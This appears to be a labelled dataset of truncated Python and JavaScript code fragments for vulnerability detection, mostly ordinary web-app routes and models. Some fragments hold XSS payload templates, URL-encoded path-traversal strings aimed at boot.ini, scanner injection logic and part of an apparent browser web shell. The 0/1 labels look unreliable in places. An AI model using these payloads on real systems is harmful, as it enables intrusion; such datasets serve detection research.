{"snippet_id": 42613, "code": " e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types", "label": 0}, {"snippet_id": 38044, "code": "\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context", "label": 0}, {"snippet_id": 39013, "code": "=\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int", "label": 0}, {"snippet_id": 5252, "code": "', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist',", "label": 0}, {"snippet_id": 37138, "code": "\tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content", "label": 0}, {"snippet_id": 33356, "code": ", expiration.CronExpireBuildLeases), webapp2.Route(r'/internal/cron/buildbucket/expire_builds', expiration.CronExpireBuilds), webapp2.Route(r'/internal/cron/buildbucket/delete_builds', expiration.CronDeleteBuilds", "label": 0}, {"snippet_id": 22140, "code": "('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$", "label": 0}, {"snippet_id": 12364, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor", "label": 0}, {"snippet_id": 14321, "code": "/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth", "label": 0}, {"snippet_id": 15362, "code": ".get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None)", "label": 0}, {"snippet_id": 17218, "code": "[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), )", "label": 0}, {"snippet_id": 9047, "code": "[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"", "label": 0}, {"snippet_id": 8515, "code": ", name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$", "label": 0}, {"snippet_id": 24275, "code": ".utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY", "label": 0}, {"snippet_id": 12922, "code": ".MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url", "label": 0}, {"snippet_id": 25021, "code": "}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super", "label": 0}, {"snippet_id": 47834, "code": "=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST", "label": 1}, {"snippet_id": 30151, "code": ".getvalue('action_hap') is not None and serv is not None: \taction=form.getvalue('action_hap') \t \tif funct.check_haproxy_config(serv): \t\tcommands=[ \"sudo systemctl %s haproxy\" % action] \t\tfunct.ssh_command(serv", "label": 0}, {"snippet_id": 26812, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 45052, "code": " fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex", "label": 0}, {"snippet_id": 35924, "code": " not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value", "label": 0}, {"snippet_id": 23707, "code": "\"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS", "label": 0}, {"snippet_id": 49698, "code": " except(TypeError, ValueError): kwargs['field']=field else: if callable(field): kwargs['field'], kwargs['render_function'], kwargs['label']=None, field, label else: kwargs['field'], kwargs['label']=field", "label": 0}, {"snippet_id": 38239, "code": "\treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif", "label": 0}, {"snippet_id": 48541, "code": " response. \"\"\" js_string: str=\"\" r: GroupReservation=None u: Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if ", "label": 0}, {"snippet_id": 43375, "code": "\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 54525, "code": ", FormMixin from markdown import markdown from.models import Article, Category, Comment class ArticleForm(forms.ModelForm): class Meta: model=Article fields=['title', 'category', 'content'] class CommentForm", "label": 0}, {"snippet_id": 4298, "code": " xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): payload=\"<img src='%s'></img>\" % self.url", "label": 1}, {"snippet_id": 41881, "code": " getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t", "label": 0}, {"snippet_id": 17337, "code": "]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name", "label": 0}, {"snippet_id": 49821, "code": ")+\"\" } catch(e){ output=e+\"\" } socket.emit('sendMSG',output) }) </script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str", "label": 0}, {"snippet_id": 21959, "code": "/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views", "label": 0}, {"snippet_id": 1805, "code": "='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print", "label": 0}, {"snippet_id": 46372, "code": " True) @allow_owner_only def save(request): response={'status': -1} collection=json.loads(request.POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}')) collection['template'", "label": 0}, {"snippet_id": 53591, "code": "=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2", "label": 0}, {"snippet_id": 44515, "code": "'Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response=", "label": 0}, {"snippet_id": 50982, "code": "(PeriodicTaskForm): fieldsets=PeriodicTaskAdmin.fieldsets \"\"\" Interval schedule does not support due_ or something. Which is absolutely terrible and vague. I can't understand why there is not an is_due()", "label": 0}, {"snippet_id": 47915, "code": "(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) if not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email", "label": 1}, {"snippet_id": 42346, "code": "\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key)", "label": 0}, {"snippet_id": 21323, "code": ".pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/", "label": 1}, {"snippet_id": 15135, "code": " CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test", "label": 0}, {"snippet_id": 32666, "code": ":]) md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len([line for line in contents.splitlines() if(line.startswith", "label": 0}, {"snippet_id": 8382, "code": ".instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')),", "label": 0}, {"snippet_id": 24029, "code": ".shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string", "label": 0}, {"snippet_id": 597, "code": " in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req", "label": 0}, {"snippet_id": 11123, "code": "\" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted", "label": 0}, {"snippet_id": 1258, "code": ": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records", "label": 0}, {"snippet_id": 4374, "code": " def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>'", "label": 0}, {"snippet_id": 40438, "code": "*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param", "label": 0}, {"snippet_id": 27602, "code": "'contact_string') template_values={ 'message': message, 'user_email': helpers.get_user_email(), 'login_url': login_url, 'switch_account_url': login_url, 'logout_url': make_logout_url(dest_url=self.request.url),", "label": 0}, {"snippet_id": 18153, "code": ".change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 2950, "code": "%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\",", "label": 0}, {"snippet_id": 17702, "code": "', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration", "label": 0}, {"snippet_id": 25403, "code": " in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or '' return data def __init__(self, *args, **kwargs): fields=[] defaults={ 'widget': self.widget, 'max_length': kwargs.pop('max_length", "label": 0}, {"snippet_id": 5081, "code": " '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate", "label": 0}, {"snippet_id": 49631, "code": " get_columns(self): \"\"\" Transform list_display into list of SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string)", "label": 0}, {"snippet_id": 18496, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 10416, "code": "\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"", "label": 0}, {"snippet_id": 12480, "code": "[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 41070, "code": ".published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, ", "label": 0}, {"snippet_id": 44816, "code": " '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2", "label": 0}, {"snippet_id": 37969, "code": ".blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t", "label": 0}, {"snippet_id": 39525, "code": " self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self", "label": 0}, {"snippet_id": 52090, "code": "['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace", "label": 0}, {"snippet_id": 17144, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 40892, "code": "\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters", "label": 0}, {"snippet_id": 45083, "code": "%s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow", "label": 0}, {"snippet_id": 10129, "code": " name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{", "label": 0}, {"snippet_id": 35204, "code": " \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))", "label": 0}, {"snippet_id": 36493, "code": " filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout", "label": 0}, {"snippet_id": 4049, "code": " xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact", "label": 0}, {"snippet_id": 42463, "code": " \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t", "label": 0}, {"snippet_id": 43817, "code": ".format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the", "label": 0}, {"snippet_id": 12200, "code": "+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$", "label": 1}, {"snippet_id": 27341, "code": " local_config from datastore import ndb from google_cloud_utils import storage from libs import auth from libs import form from libs import helpers from system import environment def add_jinja2_filter(name, fn", "label": 0}, {"snippet_id": 45910, "code": ".django_util import JsonResponse, render from desktop.lib.exceptions_renderable import PopupException from desktop.models import Document2, Document from search.conf import LATEST from dashboard.dashboard_api", "label": 0}, {"snippet_id": 12440, "code": "'staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r", "label": 0}, {"snippet_id": 47457, "code": "(http_request.GET['fault']))) elif http_request.GET.get('fault'): f.add_content(PlainText(\"Unable to add user due to: \" +str(http_request.GET['fault']))) current_user: Profile=get_current_user(http_request)", "label": 0}, {"snippet_id": 14319, "code": "[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$'", "label": 0}, {"snippet_id": 25644, "code": "('Attendee email'), initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email) ) for q in questions: answers=[a for a in pos.answerlist if a.question_id==q.id] if answers: initial=answers", "label": 0}, {"snippet_id": 2916, "code": "(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact", "label": 0}, {"snippet_id": 9659, "code": "/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include", "label": 0}, {"snippet_id": 51298, "code": ".ModelAdmin): list_display=('name', 'enable_logins', 'internet_nl_api_username') search_fields=('name',) list_filter=['enable_logins'][::-1] fields=('name', 'enable_logins', 'internet_nl_api_username',", "label": 0}, {"snippet_id": 1616, "code": "\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records", "label": 0}, {"snippet_id": 10069, "code": " \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js'", "label": 0}, {"snippet_id": 19873, "code": " / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs", "label": 0}, {"snippet_id": 41558, "code": " now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count", "label": 0}, {"snippet_id": 19335, "code": " self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var", "label": 1}, {"snippet_id": 52221, "code": "(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST'", "label": 0}, {"snippet_id": 21904, "code": "]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider", "label": 0}, {"snippet_id": 26819, "code": "%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect", "label": 0}, {"snippet_id": 12324, "code": "/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views", "label": 0}, {"snippet_id": 39483, "code": "\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self", "label": 0}, {"snippet_id": 49320, "code": "(field, 'admin_order_field', False): self.order_field=getattr(field, 'admin_order_field') if callable(field) and getattr(field, 'alters_data', False): raise SmartListException(\"Cannot use a function that", "label": 0}, {"snippet_id": 31427, "code": "=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source", "label": 0}, {"snippet_id": 37673, "code": "%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t", "label": 0}, {"snippet_id": 52672, "code": " response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters", "label": 0}, {"snippet_id": 23430, "code": "/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider", "label": 0}, {"snippet_id": 25450, "code": ".widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults", "label": 0}, {"snippet_id": 46371, "code": "(request, name, True) @allow_owner_only def save(request): response={'status': -1} collection=json.loads(request.POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}')) collection", "label": 0}, {"snippet_id": 11873, "code": "{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key", "label": 0}, {"snippet_id": 41957, "code": ", '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict", "label": 0}, {"snippet_id": 46516, "code": " massaged_collection['absoluteUrl']=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection)", "label": 0}, {"snippet_id": 52128, "code": ".fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data", "label": 1}, {"snippet_id": 43684, "code": " absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef", "label": 0}, {"snippet_id": 32293, "code": " args.external else 'localhost' server_address=(hostname, args.port) s=Server(server_address, top_level) origin='http://' +hostname if args.port !=80: origin +=':%s' % args.port print('Listening on %s/", "label": 0}, {"snippet_id": 7707, "code": "/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware", "label": 1}, {"snippet_id": 37789, "code": "\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category", "label": 0}, {"snippet_id": 14350, "code": ")$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r", "label": 0}, {"snippet_id": 44491, "code": "(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace", "label": 0}, {"snippet_id": 4644, "code": "'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', ", "label": 0}, {"snippet_id": 54791, "code": " a=form.save(commit=False) a.author=self.request.user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url", "label": 0}, {"snippet_id": 23345, "code": " urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)", "label": 0}, {"snippet_id": 32835, "code": "<body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.</body>' '</html>' % self", "label": 0}, {"snippet_id": 15153, "code": " import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color", "label": 0}, {"snippet_id": 15963, "code": " course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to", "label": 0}, {"snippet_id": 21162, "code": "'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"),", "label": 0}, {"snippet_id": 13874, "code": "', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 16198, "code": "'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 38629, "code": "\tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: 